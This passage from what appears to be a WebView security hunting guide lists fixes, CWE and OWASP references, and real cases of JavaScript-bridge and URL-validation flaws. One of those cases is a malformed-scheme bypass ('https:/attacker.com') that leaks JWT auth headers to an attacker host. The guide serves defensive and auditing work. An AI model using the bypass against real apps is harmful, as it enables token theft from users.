| Fix 0 | URL 验证用 URI 解析 | 阻止 `https:/`、`https:`、`https:\` 畸形 URL 绕过 |
| Fix 1 | Bridge origin check | 仅对可信域名暴露 Bridge |
| Fix 2 | 最小化 Bridge 方法 | 减少敏感数据暴露面 |
| Fix 3 | 安全 WebView 设置 | 禁用文件访问等危险配置 |
| Fix 4 | 输入净化 | 防止 XSS / JS 注入 |
| **Fix 5** | **拦截跨域重定向** | **防御开放重定向: 重定向到外部域名时剥离敏感头** |

> 单修 Fix 0 只能防已知绕过。Fix 1 + Fix 5 才是防住开放重定向场景的关键。

### Related CWE/OWASP

- **CWE-79**: Cross-site Scripting (XSS)
- **CWE-200**: Exposure of Sensitive Information
- **CWE-749**: Exposed Dangerous Method or Function
- **OWASP Mobile M1**: Improper Platform Usage
- **OWASP Mobile M7**: Client Code Quality

### References

- [Android WebView Security](https://developer.android.com/develop/ui/views/layout/webapps/best-practices)
- [WebView addJavascriptInterface](https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface(java.lang.Object,%20java.lang.String))
- [OWASP WebView Security](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05h-Testing-Platform-Interaction.md)

### Example Real-World Cases

1. **Phemex v5.10.0 (CVSS 9.3)**: Exported Activity + WebView Bridge token leak via `routerUrl` parameter
2. **Phemex v5.16.0 (CVSS 7.7)**: URL validation bypass via malformed scheme (`https:/attacker.com`) + Auth header injection in `loadUrl(url, headers)` — `startsWith("https://")` 验证被单斜杠绕过，WebView 自动修正后向攻击者 HTTPS 服务器发送 JWT token
3. **CVE-2020-6506**: Chrome intent:// scheme bypass
4. **Multiple banking apps**: JavaScript Bridge exposing account operations
5. **Multiple fintech apps**: `loadUrl(url, authHeaders)` without origin check — auth headers sent to all URLs

### Key Takeaways from Real Cases

- **`startsWith()` 做 URL 验证是不安全的** — 必须用 `URI` 解析
- **WebView 比你想象的更宽容** — 畸形 URL 会被自动修正
- **`loadUrl(url, headers)` 是高危模式** — 认证头会发送到任何 URL
- **开放重定向 + 白名单 = 完整利用链** — 不能只靠白名单
- **纵深防御是必须的** — 至少需要验证层 + WebView 层两层防御

---

**Hunt Version**: 3.0 (含 URL Validation Bypass + Open Redirect Defense)
**Last Updated**: 2026-03-26
**Effectiveness**: Very High (common in hybrid apps)
**Modes**: Independent Hunt + Report Verification
**New in v3.0**: Malformed URL scheme bypass patterns, auth header injection detection, open redirect defense
